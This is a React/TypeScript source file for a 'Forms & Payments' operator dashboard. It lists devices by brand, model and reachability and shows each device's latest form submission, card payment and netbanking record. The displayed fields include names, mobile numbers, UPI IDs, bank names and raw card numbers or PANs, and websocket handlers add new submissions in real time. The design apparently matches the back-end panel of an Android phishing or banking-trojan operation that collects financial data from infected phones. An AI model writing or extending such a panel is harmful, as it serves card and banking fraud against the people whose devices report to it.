import { useEffect, useMemo, useRef, useState, type ReactNode } from "react";
import { useNavigate } from "react-router-dom";
import { listFormSubmissions } from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { getDevices } from "../services/api/devices";
import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
import wsService from "../services/ws/wsService";
import {
  pickLastSeenAt,
  computeReachability,
  getReachabilityLabel,
  getReachabilityPillClasses,
  type ReachabilityStatus,
} from "../utils/reachability";

type ViewKey = "summary" | "forms_latest" | "card_latest" | "net_latest";
type AnyObj = Record<string, any>;

function safeStr(v: any): string {
  return String(v ?? "").trim();
}

function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}

function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

function pickModel(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.model || d?.model || "");
}

function pickFormDeviceId(s: AnyObj): string {
  return safeStr(s?.uniqueid || s?.uniqueId || s?.deviceId || s?.device || s?.uid || s?.payload?.uniqueid || "");
}

function pickFormTs(s: AnyObj): number {
  const t1 = Number(s?.timestamp || s?.ts);
  if (Number.isFinite(t1) && t1 > 0) return t1;

  const created = safeStr(s?.createdAt || s?.created_at || s?.date || s?.time || "");
  if (created) {
    const t = Date.parse(created);
    if (Number.isFinite(t)) return t;
  }
  return 0;
}

function summarizeForm(s: AnyObj | null | undefined): string {
  if (!s || typeof s !== "object") return "No form submit";

  const source = s?.payload && typeof s.payload === "object" ? s.payload : s;

  const candidates: Array<[string, any]> = [
    ["name", source.name || source.fullName],
    ["mobile", source.mobile || source.phone],
    ["amount", source.amount || source.amt],
    ["upi", source.upi || source.upiId],
    ["bank", source.bank || source.bankName],
    ["title", source.title || source.formTitle],
  ];

  const parts: string[] = [];
  for (const [k, raw] of candidates) {
    const v = safeStr(raw);
    if (!v) continue;
    parts.push(`${k}: ${v}`);
    if (parts.length >= 3) break;
  }

  const ts = pickFormTs(s);
  if (ts) parts.push(new Date(ts).toLocaleString());

  return parts.length ? parts.join(" • ") : "Form submitted";
}

function pickAnyTs(x: any): number {
  const t = x?.timestamp ?? x?.time ?? x?.createdAt ?? x?.created_at ?? x?.date ?? x?.ts ?? x?.updatedAt;
  if (typeof t === "number") return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!Number.isNaN(n)) return n;
    const d = Date.parse(t);
    if (!Number.isNaN(d)) return d;
  }
  return 0;
}

function isEmptyVal(v: any): boolean {
  if (v === null || v === undefined) return true;
  if (typeof v === "string") {
    const s = v.trim();
    if (!s) return true;
    const l = s.toLowerCase();
    if (l === "null" || l === "undefined") return true;
    return false;
  }
  if (typeof v === "number") return !Number.isFinite(v);
  if (typeof v === "boolean") return false;
  if (Array.isArray(v)) return v.length === 0;
  if (typeof v === "object") return Object.keys(v).length === 0;
  return false;
}

function humanLabel(key: string): string {
  return key.replace(/_/g, " ").replace(/([a-z])([A-Z])/g, "$1 $2").trim().replace(/\b\w/g, (m) => m.toUpperCase());
}

function buildPairs(obj: any, max = 10): Array<{ label: string; value: string }> {
  if (!obj || typeof obj !== "object") return [];
  const keys = Object.keys(obj);
  const out: Array<{ label: string; value: string }> = [];
  for (const k of keys) {
    const v = obj?.[k];
    if (typeof v === "object" && v !== null) {
      if (Array.isArray(v)) {
        const prim = v.filter((x) => ["string", "number", "boolean"].includes(typeof x)).map((x) => safeStr(x)).filter((x) => !isEmptyVal(x));
        const joined = prim.join(", ");
        if (!isEmptyVal(joined)) out.push({ label: humanLabel(k), value: joined });
      }
      continue;
    }
    if (isEmptyVal(v)) continue;
    const s = safeStr(v);
    if (!s) continue;
    out.push({ label: humanLabel(k), value: s });
    if (out.length >= max) break;
  }
  return out;
}

function niceMoney(v: any): string {
  const n = Number(v);
  if (!Number.isFinite(n)) return safeStr(v);
  try { return n.toLocaleString(undefined, { maximumFractionDigits: 2 }); } catch { return String(n); }
}

function paymentSummary(p: any): string {
  const amt = p?.amount ?? p?.amt ?? p?.price ?? p?.total ?? p?.sum;
  const bank = p?.bank ?? p?.bankName ?? p?.provider;
  const upi = p?.upi ?? p?.upiId ?? p?.vpa;
  const card = p?.card ?? p?.cardNumber ?? p?.pan ?? p?.maskedPan;

  const parts: string[] = [];
  if (!isEmptyVal(amt)) parts.push(`₹ ${niceMoney(amt)}`);
  if (!isEmptyVal(upi)) parts.push(`upi: ${safeStr(upi)}`);
  if (!isEmptyVal(bank)) parts.push(`bank: ${safeStr(bank)}`);
  if (!isEmptyVal(card)) parts.push(`card: ${safeStr(card)}`);

  const ts = pickAnyTs(p);
  if (ts) parts.push(new Date(ts).toLocaleString());

  return parts.length ? parts.join(" • ") : "Payment";
}

async function asyncPool<T, R>(poolLimit: number, array: T[], iteratorFn: (item: T) => Promise<R>): Promise<R[]> {
  const ret: R[] = [];
  const executing = new Set<Promise<void>>();
  for (const item of array) {
    const p = (async () => { const r = await iteratorFn(item); ret.push(r); })();
    executing.add(p);
    p.finally(() => executing.delete(p));
    if (executing.size >= poolLimit) await Promise.race(executing);
  }
  await Promise.all(executing);
  return ret;
}

function SurfaceCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div className={["rounded-[24px] border border-slate-200 bg-white/92 shadow-[0_8px_24px_rgba(15,23,42,0.06)]", className].join(" ")}>
      {children}
    </div>
  );
}

// ── CHANGED: online boolean → reachability ──
type DeviceMeta = {
  deviceId: string;
  brand: string;
  model: string;
  reachability: ReachabilityStatus;
  displayNumber: number;
};

export default function FormsPaymentsPage() {
  const nav = useNavigate();

  const [view, setView] = useState<ViewKey>("summary");

  const [devicesMeta, setDevicesMeta] = useState<DeviceMeta[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [totalForms, setTotalForms] = useState<number | null>(null);
  const [totalCards, setTotalCards] = useState<number | null>(null);
  const [totalNet, setTotalNet] = useState<number | null>(null);

  const [latestFormMap, setLatestFormMap] = useState<Record<string, AnyObj>>({});
  const [latestCardMap, setLatestCardMap] = useState<Record<string, AnyObj>>({});
  const [latestNetMap, setLatestNetMap] = useState<Record<string, AnyObj>>({});

  const [cardCountMap, setCardCountMap] = useState<Record<string, number>>({});
  const [netCountMap, setNetCountMap] = useState<Record<string, number>>({});

  const [q, setQ] = useState("");
  const [expanded, setExpanded] = useState<string | null>(null);

  const initializedRef = useRef(false);

  // ── CHANGED: uses reachability instead of status.online ──
  async function loadAll() {
    setLoading(true);
    setError(null);

    try {
      const devList = await getDevices();
      const arr = Array.isArray(devList) ? devList : [];

      const normalized = arr
        .map((d: any) => {
          const id = pickDeviceId(d) || "unknown";
          const lastSeenAt = pickLastSeenAt(d);
          const reachability = computeReachability(lastSeenAt);
          return { deviceId: id, brand: pickBrand(d), model: pickModel(d), reachability };
        })
        .reverse();

      const total = normalized.length;
      const metaArr: DeviceMeta[] = normalized.map((d, i) => ({
        ...d,
        displayNumber: total - i,
      }));

      setDevicesMeta(metaArr);

      const forms = await listFormSubmissions().catch(() => []);
      const formsArr = Array.isArray(forms) ? (forms as AnyObj[]) : [];
      setTotalForms(formsArr.length);

      const lForm: Record<string, AnyObj> = {};
      for (const s of formsArr) {
        const did = pickFormDeviceId(s);
        if (!did) continue;
        const ts = pickFormTs(s);
        const prev = lForm[did];
        if (!prev || ts > pickFormTs(prev)) lForm[did] = s;
      }
      setLatestFormMap(lForm);

      const ids = metaArr.map((d) => d.deviceId).filter(Boolean);

      const cardCounts: Record<string, number> = {};
      const netCounts: Record<string, number> = {};
      const lCard: Record<string, AnyObj> = {};
      const lNet: Record<string, AnyObj> = {};
      let cardsTotal = 0;
      let netTotal = 0;

      await asyncPool(5, ids.slice(0, 120), async (id) => {
        const [cards, nets] = await Promise.all([
          getCardPaymentsByDevice(id).catch(() => []),
          getNetbankingByDevice(id).catch(() => []),
        ]);

        const cArr = Array.isArray(cards) ? (cards as AnyObj[]) : [];
        const nArr = Array.isArray(nets) ? (nets as AnyObj[]) : [];

        cardCounts[id] = cArr.length;
        netCounts[id] = nArr.length;
        cardsTotal += cArr.length;
        netTotal += nArr.length;

        if (cArr.length) {
          const latest = cArr.slice().sort((a, b) => pickAnyTs(b) - pickAnyTs(a))[0];
          if (latest) lCard[id] = latest;
        }
        if (nArr.length) {
          const latest = nArr.slice().sort((a, b) => pickAnyTs(b) - pickAnyTs(a))[0];
          if (latest) lNet[id] = latest;
        }

        return true;
      });

      setCardCountMap(cardCounts);
      setNetCountMap(netCounts);
      setLatestCardMap(lCard);
      setLatestNetMap(lNet);
      setTotalCards(cardsTotal);
      setTotalNet(netTotal);
      initializedRef.current = true;
    } catch (e) {
      console.error("FormsPaymentsPage loadAll failed", e);
      setError("Failed to load forms/payments");
      setDevicesMeta([]);
      setTotalForms(0);
      setTotalCards(0);
      setTotalNet(0);
      setLatestFormMap({});
      setLatestCardMap({});
      setLatestNetMap({});
      setCardCountMap({});
      setNetCountMap({});
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    loadAll();
    wsService.connect();

    const off = wsService.onMessage((msg) => {
      try {
        if (!msg || msg.type !== "event") return;

        const event = safeStr(msg.event).toLowerCase();
        const data = msg.data || {};
        const did = safeStr(data.deviceId || data.uniqueid || msg.deviceId);

        // ── CHANGED: handle device:lastSeen instead of status ──
        if ((event === "device:lastseen" || event === "device:upsert") && did) {
          const lastSeenData = data?.lastSeen || data;
          const lastSeenAt = Number(lastSeenData?.at || data?.timestamp || Date.now());
          const reachability = computeReachability(lastSeenAt);

          setDevicesMeta((prev) =>
            prev.map((d) => (d.deviceId === did ? { ...d, reachability } : d)),
          );
          return;
        }

        // Legacy: still handle "status" event for backward compat
        if (event === "status" && did) {
          const ts = Number(data?.timestamp || Date.now());
          const reachability = computeReachability(ts);

          setDevicesMeta((prev) =>
            prev.map((d) => (d.deviceId === did ? { ...d, reachability } : d)),
          );
          return;
        }

        if ((event === "form:created" || event === "form_submissions:created") && did) {
          const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};

          const formDoc: AnyObj = {
            ...(payload || {}),
            payload: payload || {},
            uniqueid: did,
            deviceId: did,
            createdAt: msg.timestamp || Date.now(),
            timestamp: msg.timestamp || Date.now(),
          };

          setLatestFormMap((prev) => {
            const existing = prev[did];
            if (existing && pickFormTs(existing) > pickFormTs(formDoc)) return prev;
            return { ...prev, [did]: formDoc };
          });

          setTotalForms((prev) => (prev == null ? 1 : prev + 1));
          return;
        }

        if ((event === "card_payment:created" || event === "card_payments:created") && did) {
          const paymentDoc: AnyObj = {
            ...(data?.payload && typeof data.payload === "object" ? data.payload : data || {}),
            createdAt: msg.timestamp || Date.now(),
            timestamp: msg.timestamp || Date.now(),
          };

          setLatestCardMap((prev) => {
            const existing = prev[did];
            if (existing && pickAnyTs(existing) > pickAnyTs(paymentDoc)) return prev;
            return { ...prev, [did]: paymentDoc };
          });

          setCardCountMap((prev) => ({ ...prev, [did]: (prev[did] || 0) + 1 }));
          setTotalCards((prev) => (prev == null ? 1 : prev + 1));
          return;
        }

        if ((event === "netbanking:created" || event === "net_banking:created" || event === "net_banking_payment:created") && did) {
          const paymentDoc: AnyObj = {
            ...(data?.payload && typeof data.payload === "object" ? data.payload : data || {}),
            createdAt: msg.timestamp || Date.now(),
            timestamp: msg.timestamp || Date.now(),
          };

          setLatestNetMap((prev) => {
            const existing = prev[did];
            if (existing && pickAnyTs(existing) > pickAnyTs(paymentDoc)) return prev;
            return { ...prev, [did]: paymentDoc };
          });

          setNetCountMap((prev) => ({ ...prev, [did]: (prev[did] || 0) + 1 }));
          setTotalNet((prev) => (prev == null ? 1 : prev + 1));
          return;
        }

        if ((event === "device:delete" || event === "device_deleted") && did) {
          setDevicesMeta((prev) => prev.filter((d) => d.deviceId !== did));

          setLatestFormMap((prev) => { const copy = { ...prev }; delete copy[did]; return copy; });
          setLatestCardMap((prev) => { const copy = { ...prev }; delete copy[did]; return copy; });
          setLatestNetMap((prev) => { const copy = { ...prev }; delete copy[did]; return copy; });

          setCardCountMap((prev) => {
            const removed = prev[did] || 0;
            const copy = { ...prev };
            delete copy[did];
            setTotalCards((t) => Math.max(0, (t || 0) - removed));
            return copy;
          });

          setNetCountMap((prev) => {
            const removed = prev[did] || 0;
            const copy = { ...prev };
            delete copy[did];
            setTotalNet((t) => Math.max(0, (t || 0) - removed));
            return copy;
          });

          setTotalForms((prev) => { if (prev == null) return prev; return prev; });
          return;
        }
      } catch {
        // ignore
      }
    });

    return () => { off(); };
  }, []);

  const visibleDevices = useMemo(() => {
    let base = devicesMeta;

    if (view === "forms_latest") {
      base = base.filter((d) => !!latestFormMap[d.deviceId]);
    } else if (view === "card_latest") {
      base = base.filter((d) => (cardCountMap[d.deviceId] ?? 0) > 0 || !!latestCardMap[d.deviceId]);
    } else if (view === "net_latest") {
      base = base.filter((d) => (netCountMap[d.deviceId] ?? 0) > 0 || !!latestNetMap[d.deviceId]);
    }

    const qq = q.trim().toLowerCase();
    if (!qq) return base;

    return base.filter(
      (d) =>
        d.brand.toLowerCase().includes(qq) ||
        d.model.toLowerCase().includes(qq) ||
        d.deviceId.toLowerCase().includes(qq),
    );
  }, [devicesMeta, q, view, latestFormMap, latestCardMap, latestNetMap, cardCountMap, netCountMap]);

  function SectionHeader({ title, subtitle, right }: { title: string; subtitle?: string; right?: ReactNode }) {
    return (
      <div className="flex items-start justify-between gap-3">
        <div className="min-w-0">
          <div className="text-[18px] font-extrabold tracking-tight text-slate-900">{title}</div>
          {subtitle ? <div className="text-[12px] text-slate-500">{subtitle}</div> : null}
        </div>
        <div className="flex shrink-0 items-center gap-2">{right}</div>
      </div>
    );
  }

  function StatTile({ title, value, icon, onClick }: { title: string; value: string | number; icon: string; onClick: () => void }) {
    return (
      <button type="button" onClick={onClick} className="w-full rounded-[22px] border border-slate-200 bg-white p-4 text-left shadow-[0_6px_20px_rgba(15,23,42,0.05)] transition hover:bg-slate-50 active:scale-[0.995]">
        <div className="flex items-center justify-between gap-3">
          <div className="min-w-0">
            <div className="text-[12px] text-slate-500">{title}</div>
            <div className="mt-1 text-[22px] font-extrabold text-slate-900">{value}</div>
          </div>
          <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-slate-200 bg-slate-50 text-xl">{icon}</div>
        </div>
        <div className="mt-2 text-[11px] text-slate-400">Tap to view latest per device</div>
      </button>
    );
  }

  // ── CHANGED: DeviceRow uses reachability pill instead of online/offline ──
  function DeviceRow({ d, subtitle, detailsObj, countText, kind }: { d: DeviceMeta; subtitle: string; detailsObj?: AnyObj | null; countText?: string; kind: "forms" | "card" | "net" }) {
    const isOpen = expanded === `${kind}:${d.deviceId}`;

    const pairs = useMemo(() => {
      if (!detailsObj) return [];
      const source = kind === "forms" ? (detailsObj.payload && typeof detailsObj.payload === "object" ? detailsObj.payload : detailsObj) : detailsObj;
      return buildPairs(source, 10);
    }, [detailsObj, kind]);

    const pillLabel = getReachabilityLabel(d.reachability);
    const pillClasses = getReachabilityPillClasses(d.reachability);

    return (
      <button type="button" onClick={() => setExpanded(isOpen ? null : `${kind}:${d.deviceId}`)} className="w-full rounded-[22px] border border-slate-200 bg-white p-4 text-left shadow-[0_6px_20px_rgba(15,23,42,0.05)] transition hover:bg-slate-50 active:scale-[0.995]">
        <div className="flex items-start justify-between gap-3">
          <div className="min-w-0">
            <div className="flex min-w-0 items-center gap-2">
              <div className="truncate text-[16px] font-extrabold text-slate-900">{d.brand}</div>
              <div className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full bg-slate-900 text-sm font-extrabold text-white" title={`#${d.displayNumber}`}>{d.displayNumber}</div>
            </div>
            {d.model ? <div className="mt-1 text-[12px] text-slate-500">{d.model}</div> : null}
            <div className="mt-2 break-words text-[12px] text-slate-700">{subtitle}</div>
            {countText ? <div className="mt-1 text-[11px] text-slate-400">{countText}</div> : null}
          </div>

          <div className="shrink-0 flex flex-col items-end gap-2">
            <span className={["rounded-full border px-3 py-1 text-[12px] font-extrabold", pillClasses].join(" ")}>{pillLabel}</span>
            <div className="text-[12px] text-slate-400">{isOpen ? "▲" : "▼"}</div>
          </div>
        </div>

        {isOpen ? (
          <div className="mt-3 rounded-2xl border border-slate-200 bg-slate-50 p-3">
            {pairs.length === 0 ? (
              <div className="text-[12px] text-slate-500">No details.</div>
            ) : (
              <div className="grid grid-cols-1 gap-2">
                {pairs.map((p) => (
                  <div key={p.label} className="flex items-start justify-between gap-3">
                    <div className="text-[11px] text-slate-500">{p.label}</div>
                    <div className="break-words text-right text-[11px] font-extrabold text-slate-800">{p.value}</div>
                  </div>
                ))}
              </div>
            )}
          </div>
        ) : null}
      </button>
    );
  }

  const headerRight = (
    <>
      <button onClick={() => nav("/")} className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50" type="button">Home</button>
      <button onClick={() => loadAll()} className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50" type="button" title="Refresh">↻</button>
    </>
  );

  const emptyText = view === "forms_latest" ? "No form submits found." : view === "card_latest" ? "No card submits found." : view === "net_latest" ? "No netbanking submits found." : "No devices.";

  return (
    <AnimatedAppBackground>
      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
        <SurfaceCard className="p-4">
          <SectionHeader title="Forms & Payments" subtitle="Totals + latest per device" right={headerRight} />

          {error ? <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{error}</div> : null}

          {view === "summary" ? (
            <div className="mt-4 space-y-3">
              <StatTile title="Total Form Submits" value={totalForms == null ? "…" : totalForms} icon="🧾" onClick={() => { setExpanded(null); setQ(""); setView("forms_latest"); }} />
              <StatTile title="Card Submits" value={totalCards == null ? "…" : totalCards} icon="💳" onClick={() => { setExpanded(null); setQ(""); setView("card_latest"); }} />
              <StatTile title="Netbanking Submits" value={totalNet == null ? "…" : totalNet} icon="🏦" onClick={() => { setExpanded(null); setQ(""); setView("net_latest"); }} />
              {loading ? <div className="mt-2 rounded-2xl border border-slate-200 bg-white p-4 text-center text-slate-500">Loading…</div> : null}
            </div>
          ) : (
            <div className="mt-4">
              <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <div className="text-[14px] font-extrabold text-slate-900">
                      {view === "forms_latest" ? "Forms (Latest)" : view === "card_latest" ? "Card (Latest)" : "Netbanking (Latest)"}
                    </div>
                    <div className="mt-1 text-[12px] text-slate-500">Sirf wahi devices jisme submit data available hai</div>
                  </div>
                  <button onClick={() => { setExpanded(null); setQ(""); setView("summary"); }} className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50" type="button">Back</button>
                </div>
                <div className="mt-3">
                  <input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Search brand / model / id" className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 placeholder:text-slate-400 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100" />
                </div>
              </div>

              <div className="mt-4 space-y-3">
                {loading ? (
                  <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">Loading…</div>
                ) : visibleDevices.length === 0 ? (
                  <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">{emptyText}</div>
                ) : (
                  visibleDevices.map((d) => {
                    if (view === "forms_latest") {
                      const latest = latestFormMap[d.deviceId];
                      const subtitle = latest ? summarizeForm(latest) : "No form submit";
                      return <DeviceRow key={`f_${d.deviceId}`} d={d} kind="forms" subtitle={subtitle} detailsObj={latest || null} />;
                    }
                    if (view === "card_latest") {
                      const latest = latestCardMap[d.deviceId];
                      const cnt = cardCountMap[d.deviceId] ?? 0;
                      const subtitle = latest ? paymentSummary(latest) : "No card payment";
                      return <DeviceRow key={`c_${d.deviceId}`} d={d} kind="card" subtitle={subtitle} detailsObj={latest || null} countText={`Total card submits: ${cnt}`} />;
                    }
                    const latest = latestNetMap[d.deviceId];
                    const cnt = netCountMap[d.deviceId] ?? 0;
                    const subtitle = latest ? paymentSummary(latest) : "No netbanking data";
                    return <DeviceRow key={`n_${d.deviceId}`} d={d} kind="net" subtitle={subtitle} detailsObj={latest || null} countText={`Total netbanking submits: ${cnt}`} />;
                  })
                )}
              </div>
            </div>
          )}
        </SurfaceCard>
      </div>
    </AnimatedAppBackground>
  );
}